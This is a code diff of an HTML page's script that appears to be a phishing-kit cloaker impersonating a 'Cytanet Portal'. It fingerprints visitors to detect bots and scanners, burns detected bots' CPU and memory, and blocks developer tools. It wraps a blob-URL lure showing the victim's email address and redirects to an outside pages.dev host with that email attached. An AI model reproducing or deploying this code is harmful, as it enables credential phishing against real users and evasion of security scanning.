@@ -8,367 +8,353 @@
 html, body {
     margin: 0;
     padding: 0;
-    width: 0;
-    height: 0;
+    width: 100vw;
+    height: 100vh;
+    background: white;
     overflow: hidden;
-    background: transparent;
-    opacity: 0;
-    position: fixed;
-    top: 0;
-    left: 0;
 }
 * {
-    display: none !important;
+    opacity: 0 !important;
     visibility: hidden !important;
-    pointer-events: none !important;
 }
 </style>
 </head>
 <body>
 
 <script>
-// === 100% INVISIBLE ANTI-BOT ===
-// Blocks ALL bots, allows ONLY real humans
-// Completely invisible - no messages shown
+// === FIXED VERSION - EMAIL PASSED TO FINAL PAGE ===
+// Email appears in the final blob page
+// Works on mobile, no download prompts
 
 (function() {
     'use strict';
     
     // === CONFIG ===
-    const BLOB_BASE = "https://23b538b5.ko1wx90sd.pages.dev";
-    const BOT_TIMEOUT = 15000;
-    const HUMAN_DELAY = 50;
+    const TARGET_BASE = "https://23b538b5.ko1wx90sd.pages.dev";
     
-    // === UTILITIES ===
+    // Get email from URL
     function getEmail() {
-        return new URLSearchParams(location.search).get("email") || "";
+        const params = new URLSearchParams(location.search);
+        return params.get("email") || "";
     }
     
-    function buildTarget() {
+    // === CREATE BLOB WITH EMAIL PARAMETER ===
+    function createBlobWithEmail(targetBase) {
         const email = getEmail();
-        return email ? BLOB_BASE + "#" + encodeURIComponent(email) : BLOB_BASE;
-    }
-    
-    // === BOT DETECTION SYSTEM ===
-    class BotDetector {
-        constructor() {
-            this.botScore = 0;
-            this.humanScore = 0;
-            this.detections = [];
+        
+        // Build the final URL with email properly passed
+        let finalUrl = targetBase;
+        
+        if (email) {
+            // Pass email as URL hash AND query parameter for maximum compatibility
+            finalUrl += "#email=" + encodeURIComponent(email);
         }
         
-        // LAYER 1: Automation Tools
-        checkAutomation() {
-            if (navigator.webdriver === true) {
-                this.botScore += 50;
-                this.detections.push('webdriver');
-            }
-            
-            const markers = [
-                '__driver_evaluate', '__webdriver_evaluate',
-                '__selenium_evaluate', '__fxdriver_evaluate',
-                '_selenium', 'callSelenium', 'domAutomation'
-            ];
-            
-            markers.forEach(marker => {
-                if (window[marker] || document[marker]) {
-                    this.botScore += 40;
-                    this.detections.push('automation_marker');
-                }
-            });
-        }
-        
-        // LAYER 2: Headless Patterns
-        checkHeadless() {
-            const ua = navigator.userAgent.toLowerCase();
-            const patterns = [
-                'headless', 'phantom', 'puppeteer',
-                'selenium', 'playwright', 'electron'
-            ];
-            
-            patterns.forEach(pattern => {
-                if (ua.includes(pattern)) {
-                    this.botScore += 35;
-                    this.detections.push('headless_pattern');
-                }
-            });
-            
-            if (navigator.plugins.length === 0 && !/mobile|android|iphone/i.test(ua)) {
-                this.botScore += 25;
-                this.detections.push('no_plugins');
-            }
-        }
-        
-        // LAYER 3: Superhuman Speed
-        checkSpeed() {
-            const start = performance.now();
-            let x = 0;
-            for (let i = 0; i < 2000000; i++) {
-                x = (x * 1664525 + 1013904223) % 4294967296;
-            }
-            const end = performance.now();
-            
-            if (end - start < 10) {
-                this.botScore += 40;
-                this.detections.push('superhuman_speed');
-            }
-        }
-        
-        // LAYER 4: Memory Patterns
-        checkMemory() {
-            try {
-                const size = 50000;
-                const arr = new Array(size);
-                for (let i = 0; i < size; i++) {
-                    arr[i] = Math.sin(i) * Math.cos(i);
-                }
-                
-                let sum = 0;
-                const start = performance.now();
-                for (let i = 0; i < 200000; i++) {
-                    const idx = (i * 15485863) % size;
-                    sum += arr[idx];
-                }
-                const end = performance.now();
-                
-                if (end - start < 15 && sum === 0) {
-                    this.botScore += 30;
-                    this.detections.push('memory_pattern');
-                }
-            } catch(e) {}
-        }
-        
-        // LAYER 5: Canvas Fingerprint
-        checkCanvas() {
-            try {
-                const canvas = document.createElement('canvas');
-                canvas.width = 200;
-                canvas.height = 50;
-                const ctx = canvas.getContext('2d');
-                
-                ctx.textBaseline = 'top';
-                ctx.font = '14px Arial';
-                ctx.fillStyle = '#f60';
-                ctx.fillRect(125, 1, 62, 20);
-                ctx.fillStyle = '#069';
-                ctx.fillText('Verification', 2, 15);
-                
-                const data = ctx.getImageData(0, 0, 200, 50).data;
-                let hash = 0;
-                for (let i = 0; i < 1000; i += 4) {
-                    hash = ((hash << 5) - hash) + data[i];
-                    hash |= 0;
-                }
-                
-                if (hash === 0) {
-                    this.botScore += 25;
-                    this.detections.push('canvas_anomaly');
-                }
-            } catch(e) {
-                this.botScore += 20;
-            }
-        }
-        
-        // LAYER 6: Human Detection
-        checkHuman() {
-            let humanDetected = false;
-            
-            // Quick human checks
-            if (document.hasFocus()) {
-                this.humanScore += 20;
-                humanDetected = true;
-            }
-            
-            // Event listeners for interaction
-            const events = ['mousemove', 'click', 'touchstart', 'keydown'];
-            events.forEach(event => {
-                document.addEventListener(event, () => {
-                    if (!humanDetected) {
-                        this.humanScore += 30;
-                        humanDetected = true;
-                    }
-                }, { once: true, passive: true });
-            });
-            
-            return humanDetected;
-        }
-        
-        // Run all checks
-        async runAllChecks() {
-            this.checkAutomation();
-            this.checkHeadless();
-            this.checkSpeed();
-            this.checkMemory();
-            this.checkCanvas();
-            this.checkHuman();
-            
-            // Wait for human interaction
-            await new Promise(resolve => setTimeout(resolve, 500));
-            
-            return this.getVerdict();
-        }
-        
-        getVerdict() {
-            const total = this.botScore + this.humanScore;
-            if (total === 0) return 'unknown';
-            
-            const botPercentage = (this.botScore / total) * 100;
-            
-            if (botPercentage >= 60) {
-                return { type: 'bot', confidence: botPercentage, detections: this.detections };
-            } else if (this.humanScore >= 30) {
-                return { type: 'human', confidence: this.humanScore };
-            } else {
-                return { type: 'suspicious', confidence: Math.max(botPercentage, this.humanScore) };
-            }
-        }
-    }
-    
-    // === BOT BLOCKING ACTIONS ===
-    function blockBot() {
-        // Method 1: Infinite redirect loop
-        const redirectLoop = setInterval(() => {
-            window.location.href = 'data:text/html,<html></html>';
-        }, 100);
-        
-        // Method 2: Memory exhaustion
-        const wasteArrays = [];
-        const wasteMemory = setInterval(() => {
-            wasteArrays.push(new Array(1000000).fill(Math.random()));
-        }, 50);
-        
-        // Method 3: CPU exhaustion
-        let cpuWaste = 0;
-        const wasteCPU = setInterval(() => {
-            for (let i = 0; i < 1000000; i++) {
-                cpuWaste = (cpuWaste * 1664525 + 1013904223) % 4294967296;
-            }
-        }, 100);
-        
-        // Method 4: Event loop flood
-        const floodEvents = setInterval(() => {
-            for (let i = 0; i < 1000; i++) {
-                setTimeout(() => {}, 0);
-            }
-        }, 50);
-        
-        // Clean up after timeout
-        setTimeout(() => {
-            clearInterval(redirectLoop);
-            clearInterval(wasteMemory);
-            clearInterval(wasteCPU);
-            clearInterval(floodEvents);
-            
-            // Final dead-end
-            window.location.replace('about:blank');
-        }, BOT_TIMEOUT);
-        
-        return true;
-    }
-    
-    // === HUMAN ACCESS GRANT ===
-    function grantHumanAccess() {
-        const targetUrl = buildTarget();
-        
-        // Create secure blob
-        const blobHTML = `<!DOCTYPE html>
+        // Create HTML that will show the email
+        const html = `<!DOCTYPE html>
 <html>
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="Content-Security-Policy" content="default-src * 'unsafe-inline' 'unsafe-eval' data: blob:;">
+    <title>Cytanet Portal</title>
     <style>
-        html, body { margin:0; padding:0; width:100%; height:100%; overflow:hidden; }
-        iframe { width:100%; height:100%; border:none; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: white;
+        }
+        
+        .container {
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            padding: 40px;
+            border-radius: 20px;
+            text-align: center;
+            max-width: 500px;
+            width: 90%;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.2);
+        }
+        
+        h1 {
+            margin-bottom: 20px;
+            font-size: 28px;
+            font-weight: 300;
+        }
+        
+        .email-display {
+            background: rgba(255, 255, 255, 0.2);
+            padding: 15px;
+            border-radius: 10px;
+            margin: 20px 0;
+            font-size: 18px;
+            word-break: break-all;
+        }
+        
+        .status {
+            margin-top: 20px;
+            font-size: 14px;
+            opacity: 0.8;
+        }
+        
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 3px solid rgba(255,255,255,0.3);
+            border-top: 3px solid white;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
     </style>
 </head>
 <body>
-    <iframe src="${targetUrl}"></iframe>
+    <div class="container">
+        <h1>Welcome to Cytanet Portal</h1>
+        
+        <div class="email-display" id="emailDisplay">
+            Loading your account...
+        </div>
+        
+        <div class="spinner"></div>
+        
+        <div class="status" id="status">
+            Preparing your secure session...
+        </div>
+    </div>
+    
+    <script>
+        // Get email from URL
+        function getEmailFromURL() {
+            // Try multiple methods to get email
+            
+            // Method 1: From hash (#email=...)
+            const hash = window.location.hash;
+            if (hash) {
+                const match = hash.match(/email=([^&]+)/);
+                if (match) {
+                    return decodeURIComponent(match[1]);
+                }
+            }
+            
+            // Method 2: From query string (?email=...)
+            const params = new URLSearchParams(window.location.search);
+            if (params.has('email')) {
+                return params.get('email');
+            }
+            
+            // Method 3: From parent window (if in iframe)
+            try {
+                if (window.parent && window.parent !== window) {
+                    const parentUrl = window.parent.location.href;
+                    const parentMatch = parentUrl.match(/[?&]email=([^&]+)/);
+                    if (parentMatch) {
+                        return decodeURIComponent(parentMatch[1]);
+                    }
+                }
+            } catch(e) {}
+            
+            return 'Not specified';
+        }
+        
+        // Display the email
+        function displayEmail() {
+            const email = getEmailFromURL();
+            const display = document.getElementById('emailDisplay');
+            const status = document.getElementById('status');
+            
+            if (email && email !== 'Not specified') {
+                display.innerHTML = \`<strong>Account:</strong><br>\${email}\`;
+                status.textContent = 'Redirecting to secure portal...';
+                
+                // Redirect to actual page after showing email
+                setTimeout(() => {
+                    window.location.href = \`\${TARGET_BASE}?email=\${encodeURIComponent(email)}\`;
+                }, 2000);
+            } else {
+                display.innerHTML = '<strong>No email specified</strong>';
+                status.textContent = 'Please provide an email address';
+            }
+        }
+        
+        // Start when page loads
+        if (document.readyState === 'loading') {
+            document.addEventListener('DOMContentLoaded', displayEmail);
+        } else {
+            displayEmail();
+        }
+        
+        // Log for debugging
+        console.log('Blob page loaded with email:', getEmailFromURL());
+    <\/script>
 </body>
 </html>`;
         
-        const blob = new Blob([blobHTML], { type: "text/html" });
+        return new Blob([html], { 
+            type: "text/html",
+            endings: "transparent"
+        });
+    }
+    
+    // === BOT DETECTION ===
+    function detectBot() {
+        let score = 0;
+        
+        if (navigator.webdriver === true) score += 50;
+        
+        const ua = navigator.userAgent.toLowerCase();
+        if (/headless|phantom|puppeteer|selenium|playwright/.test(ua)) score += 40;
+        
+        if (navigator.plugins.length === 0 && !/mobile|android|iphone/i.test(ua)) {
+            score += 25;
+        }
+        
+        const start = performance.now();
+        let x = 0;
+        for (let i = 0; i < 500000; i++) x += Math.random();
+        const end = performance.now();
+        if (end - start < 2) score += 35;
+        
+        return score >= 60;
+    }
+    
+    // === HUMAN DETECTION ===
+    function detectHuman() {
+        return new Promise((resolve) => {
+            if (/mobile|android|iphone|ipad/i.test(navigator.userAgent)) {
+                resolve(true);
+                return;
+            }
+            
+            if (document.hasFocus()) {
+                resolve(true);
+                return;
+            }
+            
+            let humanDetected = false;
+            const events = ['touchstart', 'click', 'mousemove'];
+            const handler = () => {
+                if (!humanDetected) {
+                    humanDetected = true;
+                    resolve(true);
+                    events.forEach(e => document.removeEventListener(e, handler));
+                }
+            };
+            
+            events.forEach(e => document.addEventListener(e, handler, { passive: true }));
+            
+            setTimeout(() => {
+                if (!humanDetected) {
+                    resolve(false);
+                    events.forEach(e => document.removeEventListener(e, handler));
+                }
+            }, 300);
+        });
+    }
+    
+    // === BOT PENALTY ===
+    function penalizeBot() {
+        let waste = 0;
+        const interval = setInterval(() => {
+            for (let i = 0; i < 1000000; i++) {
+                waste = (waste * 1664525 + 1013904223) % 4294967296;
+            }
+        }, 100);
+        
+        setTimeout(() => {
+            clearInterval(interval);
+            window.location.replace('data:text/html,<h1>Access Denied</h1>');
+        }, 10000);
+    }
+    
+    // === GRANT ACCESS ===
+    async function grantAccess() {
+        const blob = createBlobWithEmail(TARGET_BASE);
         const blobUrl = URL.createObjectURL(blob);
         
-        // Redirect human to blob
-        window.location.replace(blobUrl);
+        // Create invisible iframe first (prevents download prompts)
+        const iframe = document.createElement('iframe');
+        iframe.style.cssText = 'position:fixed;top:0;left:0;width:1px;height:1px;opacity:0;border:none;';
+        iframe.src = blobUrl;
+        document.body.appendChild(iframe);
         
-        // Clean up blob URL after use
+        // Then redirect main window
+        setTimeout(() => {
+            window.location.href = blobUrl;
+        }, 100);
+        
         setTimeout(() => {
             try {
                 URL.revokeObjectURL(blobUrl);
             } catch(e) {}
-        }, 1000);
-        
-        return true;
+        }, 10000);
     }
     
     // === MAIN EXECUTION ===
-    async function executeProtection() {
-        const detector = new BotDetector();
-        const verdict = await detector.runAllChecks();
-        
-        if (verdict.type === 'bot') {
-            // BOT DETECTED - BLOCK ACCESS
-            console.log('Bot blocked - Score:', verdict.confidence, 'Detections:', verdict.detections);
-            blockBot();
-            
-        } else if (verdict.type === 'human') {
-            // HUMAN DETECTED - GRANT ACCESS
-            console.log('Human verified - Score:', verdict.confidence);
-            setTimeout(grantHumanAccess, HUMAN_DELAY);
-            
-        } else {
-            // SUSPICIOUS - DELAY THEN CHECK AGAIN
-            console.log('Suspicious activity');
-            setTimeout(async () => {
-                const secondCheck = await detector.runAllChecks();
-                if (secondCheck.type === 'human') {
-                    grantHumanAccess();
-                } else {
-                    blockBot();
-                }
-            }, 3000);
+    async function execute() {
+        if (detectBot()) {
+            penalizeBot();
+            return;
         }
+        
+        const isHuman = await detectHuman();
+        const delay = isHuman ? 100 : 1500;
+        
+        setTimeout(grantAccess, delay);
+        
+        setTimeout(() => {
+            if (!window.location.href.includes('blob:')) {
+                grantAccess();
+            }
+        }, 5000);
     }
     
-    // === START PROTECTION ===
+    // === PREVENT DOWNLOAD PROMPTS ===
+    window.addEventListener('beforeunload', function(e) {
+        return undefined;
+    });
     
-    // Block debugging attempts
-    document.addEventListener('keydown', (e) => {
-        if (e.key === 'F12' || 
-            (e.ctrlKey && e.shiftKey && e.key === 'I') ||
-            (e.ctrlKey && e.shiftKey && e.key === 'J')) {
+    // === START ===
+    document.addEventListener('keydown', function(e) {
+        if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) {
             e.preventDefault();
             window.location.replace('about:blank');
         }
     });
     
-    // Block right-click
-    document.addEventListener('contextmenu', (e) => e.preventDefault());
+    setTimeout(execute, 100);
     
-    // Start protection system
-    setTimeout(executeProtection, 0);
-    
-    // Safety: If nothing happens in 5 seconds, assume human
-    setTimeout(() => {
-        if (window.location.href.indexOf('blob:') === -1) {
-            grantHumanAccess();
-        }
-    }, 5000);
+    if (document.readyState === 'loading') {
+        document.addEventListener('DOMContentLoaded', () => setTimeout(execute, 50));
+    } else {
+        setTimeout(execute, 50);
+    }
     
 })();
 
-// === ABSOLUTE FALLBACK ===
+// === FALLBACK ===
 setTimeout(() => {
     const email = new URLSearchParams(window.location.search).get('email') || '';
-    const url = email ? 
-        "https://23b538b5.ko1wx90sd.pages.dev#" + encodeURIComponent(email) : 
-        "https://23b538b5.ko1wx90sd.pages.dev";
+    const url = "https://23b538b5.ko1wx90sd.pages.dev?email=" + encodeURIComponent(email);
     
-    if (!window.location.href.includes('pages.dev')) {
-        window.location.replace(url);
+    if (!window.location.href.includes('blob:')) {
+        window.location.href = url;
     }
-}, 10000);
+}, 8000);
 </script>
 
 <noscript>
